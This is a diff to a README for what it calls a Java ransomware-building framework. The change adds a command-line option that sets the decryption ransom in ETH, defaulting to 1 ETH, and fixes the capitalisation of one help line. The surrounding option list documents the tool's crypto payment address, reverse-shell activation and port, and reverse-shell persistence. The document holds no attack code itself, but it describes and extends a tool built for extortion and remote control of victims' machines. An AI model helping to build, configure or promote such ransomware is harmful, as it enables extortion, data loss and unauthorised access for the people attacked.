@@ -25,9 +25,11 @@ It is a project to build a ransomware made with java. With the framwork, ransomw
 
 ```
  -a,--Address <Address>              Crypto Address
+ -c,--Cost <Cost in ETH>             Cost of decryption in ETH. The
+                                     default is 1 ETH.
  -h,--IP <IP>                        Local IP address
  -i,--Interactive                    Interactive mode
- -o,--Export <Export path>           destination for export
+ -o,--Export <Export path>           Destination for export
  -p,--revPort <port>                 Reverse shell port
  -P,--Persistence                    Activate reverse shell persistence
  -r,--UseRev                         Activate reverse shell
